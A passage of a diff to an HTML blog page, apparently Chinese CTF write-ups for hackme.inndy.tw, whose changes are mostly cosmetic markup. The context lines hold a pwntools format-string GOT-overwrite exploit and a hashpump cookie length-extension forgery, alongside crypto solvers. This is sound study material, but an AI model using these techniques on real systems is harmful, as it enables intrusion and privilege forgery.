-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;libc_addr: {:#x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">libc_addr</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;main_addr: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">main_addr</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;libc_addr: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">libc_addr</span><span class="p">))</span>
 
 <span class="c1"># 得到 libc 基址</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">,</span> <span class="n">libc_addr</span><span class="p">)</span>
 <span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">)</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;libc_base: {:#x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;libc_base: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
 
 <span class="c1"># 得到 elf 基址</span>
 <span class="n">elf_offset</span> <span class="o">=</span> <span class="n">main_addr</span> <span class="o">-</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
 <span class="c1"># 得到 printf_got 地址</span>
 <span class="n">printf_got</span> <span class="o">=</span> <span class="n">elf_offset</span> <span class="o">+</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;printf_got: {:#x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">printf_got</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;printf_got: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">printf_got</span><span class="p">))</span>
 <span class="c1"># 得到 system 地址</span>
 <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;system_addr: {:#x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;system_addr: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
 
 <span class="c1"># 64位没法使用 fmtstr_payload, 因为默认把地址放在前面会导致大概率被 \x00 截断</span>
 <span class="k">def</span> <span class="nf">fmt_str_payload64</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
@@ -1200,7 +1200,7 @@ Tips: ASLR enabled</p>
     <span class="n">addr</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
     <span class="n">chr_cnt</span> <span class="o">=</span> <span class="mi">0</span>
     <span class="k">for</span> <span class="n">index</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
-        <span class="n">payload1</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;%{:02}c%{}$hhn&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">value</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-</span><span class="n">chr_cnt</span><span class="p">,</span> <span class="n">offset</span><span class="o">+</span><span class="mi">9</span><span class="o">+</span><span class="n">index</span><span class="p">))</span>
+        <span class="n">payload1</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;%</span><span class="si">{:02}</span><span class="s1">c%</span><span class="si">{}</span><span class="s1">$hhn&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">value</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-</span><span class="n">chr_cnt</span><span class="p">,</span> <span class="n">offset</span><span class="o">+</span><span class="mi">9</span><span class="o">+</span><span class="n">index</span><span class="p">))</span>
         <span class="n">payload2</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">src</span><span class="o">+</span><span class="n">value</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
         <span class="n">chr_cnt</span> <span class="o">=</span> <span class="n">value</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
 
@@ -1222,16 +1222,16 @@ Tips: ASLR enabled</p>
 <blockquote>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nc hackme.inndy.tw <span class="m">7720</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nc hackme.inndy.tw <span class="m">7720</span>
 </code></pre></td></tr></table>
 </div>
 </div></blockquote>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1240,7 +1240,7 @@ Tips: ASLR enabled</p>
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">➤ checksec echo3
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">➤ checksec echo3
 [*] &#39;/home/aloxaf/CTF/echo3&#39;
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -1260,12 +1260,12 @@ Tips: ASLR enabled</p>
 <p><del>一直失败, 后来冷静分析才意识到这段内存不一定全部都能访问, 而且 0xFFFFFFFF bytes = 4 GiB. 怎么可能这样泄露&hellip;</del></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c">  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&#34;Try to read the flag</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mh">0x15u</span><span class="p">);</span>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&#34;Try to read the flag</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mh">0x15u</span><span class="p">);</span>
   <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x10000u</span><span class="p">);</span>
   <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">size_t</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">);</span>
 </code></pre></td></tr></table>
@@ -1274,7 +1274,7 @@ Tips: ASLR enabled</p>
 <p>非常硬却失挺的方法, 学习了</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1291,7 +1291,7 @@ Tips: ASLR enabled</p>
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">gdb</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;konsole&#39;</span><span class="p">,</span> <span class="s1">&#39;-e&#39;</span><span class="p">]</span>
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;DEBUG&#39;</span>
@@ -1353,7 +1353,7 @@ Tips: What is symmetric cipher?</p>
 <p>这意味着, 密文中不会出现明文中有的字符&hellip;那么只要收集到足够的密文然后统计就行了</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1373,7 +1373,7 @@ Tips: What is symmetric cipher?</p>
 </span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">Crypto.Util</span> <span class="kn">import</span> <span class="n">number</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">Crypto.Util</span> <span class="kn">import</span> <span class="n">number</span>
 <span class="kn">import</span> <span class="nn">requests</span>
 
 <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://hackme.inndy.tw/otp/?issue_otp=illya&#39;</span>
@@ -1387,10 +1387,10 @@ Tips: What is symmetric cipher?</p>
 <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="mi">0</span><span class="p">])):</span>
     <span class="n">c</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span> <span class="o">-</span> <span class="nb">set</span><span class="p">([</span><span class="n">i</span><span class="p">[</span><span class="n">_</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">b</span><span class="p">])</span>
     <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="o">.</span><span class="n">pop</span><span class="p">()),</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="o">.</span><span class="n">pop</span><span class="p">()),</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
-        <span class="k">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">c</span><span class="p">))</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">c</span><span class="p">))</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>然而很迷的是跑出来的 FLAG 不完整&hellip;好在能够猜出来</p>
@@ -1409,17 +1409,17 @@ Tips: What is symmetric cipher?</p>
 <p>注意到得到 flag 的条件是 <code>$user['admin']</code>为 true, 也就是说对用户名并没有要求</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">if</span><span class="p">(</span><span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;admin&#39;</span><span class="p">])</span> <span class="nx">printf</span><span class="p">(</span><span class="s2">&#34;&lt;code&gt;%s&lt;/code&gt;&#34;</span><span class="p">,</span> <span class="nx">htmlentities</span><span class="p">(</span><span class="nv">$flag</span><span class="p">));</span> <span class="cp">?&gt;</span><span class="err">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">if</span><span class="p">(</span><span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;admin&#39;</span><span class="p">])</span> <span class="nx">printf</span><span class="p">(</span><span class="s2">&#34;&lt;code&gt;%s&lt;/code&gt;&#34;</span><span class="p">,</span> <span class="nx">htmlentities</span><span class="p">(</span><span class="nv">$flag</span><span class="p">));</span> <span class="cp">?&gt;</span><span class="err">
 </span></code></pre></td></tr></table>
 </div>
 </div><p>分析设置 cookie 的代码, 得知 cookie 内容为 <code>$sig#$serialized</code>, 以 guest 为例, 内容为 <code>6bcb9c9155975a53e951b0b50f137480#name=guest&amp;admin=0 </code></p>
 <p>只要能够修改 admin 为非 0 值, 就能得到 flag.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1435,7 +1435,7 @@ Tips: What is symmetric cipher?</p>
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">set_user</span><span class="p">(</span><span class="nv">$user_data</span><span class="p">)</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">set_user</span><span class="p">(</span><span class="nv">$user_data</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="k">global</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$secret</span><span class="p">;</span>
 
@@ -1454,7 +1454,7 @@ Tips: What is symmetric cipher?</p>
 </div><p>然而 cookie 有验证过程, cookie 通过验证的条件是: <code>md5(md5($secret).$serialized) == $sig</code>, 如果知道 <code>$secret</code> 的值的话, 就很简单了, 然而并不知道&hellip;</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1474,7 +1474,7 @@ Tips: What is symmetric cipher?</p>
 </span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">load_user</span><span class="p">()</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">load_user</span><span class="p">()</span>
 <span class="p">{</span>
     <span class="k">global</span> <span class="nv">$secret</span><span class="p">,</span> <span class="nv">$error</span><span class="p">;</span>
 
@@ -1515,12 +1515,12 @@ Tips: What is symmetric cipher?</p>
 <p>以 hashdump 和马猴烧酒为例, 用如下命令可以得到新的 <code>$sig</code> 和 <code>$serialized</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">▶ hashpump -s 6bcb9c9155975a53e951b0b50f137480 -d &#39;name=guest&amp;admin=0&#39; -a &#39;illya&#39; -k 32
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">▶ hashpump -s 6bcb9c9155975a53e951b0b50f137480 -d &#39;name=guest&amp;admin=0&#39; -a &#39;illya&#39; -k 32
 4b6fe69cd0880b2e01e609d8ed9fd30a
 name=guest&amp;admin=0\x80\x00\x00\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00illya
 </code></pre></td></tr></table>
@@ -1540,7 +1540,7 @@ name=guest&amp;admin=0\x80\x00\x00\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00il
 <p>代码逻辑不难, 加密部分直接爆破就行. 需要注意的是程序在 nodejs 环境下才能运行.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1548,12 +1548,12 @@ name=guest&amp;admin=0\x80\x00\x00\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00il
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">crack</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">crack</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
         <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="mh">0xb1</span> <span class="o">+</span> <span class="mh">0x1b</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="o">==</span> <span class="n">n</span><span class="p">:</span>
             <span class="k">return</span> <span class="n">i</span>
 
-<span class="k">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">([</span><span class="n">crack</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">crypted</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+<span class="nb">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">([</span><span class="n">crack</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">crypted</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>得到后直接放参数里运行</p>
@@ -1565,7 +1565,7 @@ name=guest&amp;admin=0\x80\x00\x00\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00il
 <p>一开始直接用Int类型跑半天没跑出结果, 后来看了 M4x 师傅的博客才知道BitVec更快orz,  算一算最大262位</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1589,7 +1589,7 @@ name=guest&amp;admin=0\x80\x00\x00\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00il
 </span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">json</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">json</span>
 <span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">json</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;crypted&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
@@ -1608,7 +1608,7 @@ name=guest&amp;admin=0\x80\x00\x00\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00il
 <span class="n">models</span> <span class="o">=</span> <span class="p">[]</span>
 <span class="k">while</span> <span class="n">solver</span><span class="o">.</span><span class="n">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span><span class="p">:</span>
     <span class="n">m</span> <span class="o">=</span> <span class="n">solver</span><span class="o">.</span><span class="n">model</span><span class="p">()</span>
-    <span class="k">print</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
     <span class="n">models</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
     <span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">Or</span><span class="p">(</span><span class="n">a</span> <span class="o">!=</span> <span class="n">m</span><span class="p">[</span><span class="n">a</span><span class="p">],</span> <span class="n">b</span> <span class="o">!=</span> <span class="n">m</span><span class="p">[</span><span class="n">b</span><span class="p">],</span> <span class="n">c</span> <span class="o">!=</span> <span class="n">m</span><span class="p">[</span><span class="n">c</span><span class="p">]))</span>
 </code></pre></td></tr></table>
@@ -1616,11 +1616,11 @@ name=guest&amp;admin=0\x80\x00\x00\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00il
 </div><p>这次还好, 只有一组值.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">p</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">p</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span>
 <span class="n">q</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span>
 </code></pre></td></tr></table>
 </div>
@@ -1628,7 +1628,7 @@ name=guest&amp;admin=0\x80\x00\x00\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00il
 <p>和 RSA 的共模攻击很像,  <del>照着 CTF wiki  的代码抄一遍</del></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1641,7 +1641,7 @@ name=guest&amp;admin=0\x80\x00\x00\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00il
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">gmpy2</span> <span class="kn">import</span> <span class="n">gcdext</span><span class="p">,</span> <span class="n">invert</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">gmpy2</span> <span class="kn">import</span> <span class="n">gcdext</span><span class="p">,</span> <span class="n">invert</span>
 <span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
 
 <span class="n">a</span> <span class="o">=</span> <span class="n">m</span><span class="p">[</span><span class="n">a</span><span class="p">]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span>
@@ -1651,7 +1651,7 @@ name=guest&amp;admin=0\x80\x00\x00\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00il
 <span class="n">s</span> <span class="o">=</span> <span class="o">-</span><span class="n">s</span> <span class="c1"># 此处 s &lt; 0</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">invert</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span>
 <span class="n">plain</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span> <span class="o">*</span> <span class="nb">pow</span><span class="p">(</span><span class="n">q</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span> <span class="o">%</span> <span class="n">M</span>
-<span class="k">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">plain</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">plain</span><span class="p">))</span>
 </code></pre></td></tr></table>
 </div>
 </div><h1 id="programming">Programming</h1>
@@ -1659,10 +1659,10 @@ name=guest&amp;admin=0\x80\x00\x00\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00il
 <blockquote>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">nc hackme.inndy.tw 7707
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">nc hackme.inndy.tw 7707
 </code></pre></td></tr></table>
 </div>
 </div><p>How fast could you be?</p>
@@ -1676,7 +1676,7 @@ name=guest&amp;admin=0\x80\x00\x00\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00il
 <p>这道题用 cython 很合适, 就拿 cython 来写了. (吹一波 ipython, 真的好用, <code>%load_ext cython</code> 后就能方便地写 cython 代码了</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1712,7 +1712,7 @@ name=guest&amp;admin=0\x80\x00\x00\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00il
 </span><span class="lnt">34
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-cython" data-lang="cython"><span class="o">%%</span><span class="n">cython</span> 
+<pre tabindex="0" class="chroma"><code class="language-cython" data-lang="cython"><span class="o">%%</span><span class="n">cython</span> 
 <span class="k">import</span> <span class="nn">cython</span>
 <span class="k">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
 
@@ -1764,11 +1764,11 @@ name=guest&amp;admin=0\x80\x00\x00\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00il
 <p>转成 html</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">pacman -S poppler
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pacman -S poppler
 pdftohtml --help
 </code></pre></td></tr></table>
 </div>
@@ -1835,7 +1835,7 @@ pdftohtml --help
   <script type="text/javascript">
     new Valine({
         el: '#vcomments' ,
-        serverURLs: 'https:\/\/lcd.aloxaf.cn',
+        serverURLs: '',
         appId: 'fSbXaElXXTznggVXiWy8NFBU-gzGzoHsz',
         appKey: 'kK3SxB14xAACgHftKrSaBRDU',
         notify:  false ,
@@ -1873,7 +1873,7 @@ pdftohtml --help
   <span class="copyright-year">
     &copy; 
     2017 - 
-    2021<span class="heart"><i class="iconfont icon-heart"></i></span><span>Aloxaf</span>
+    2022<span class="heart"><i class="iconfont icon-heart"></i></span><span>Aloxaf</span>
   </span>
 </div>
 
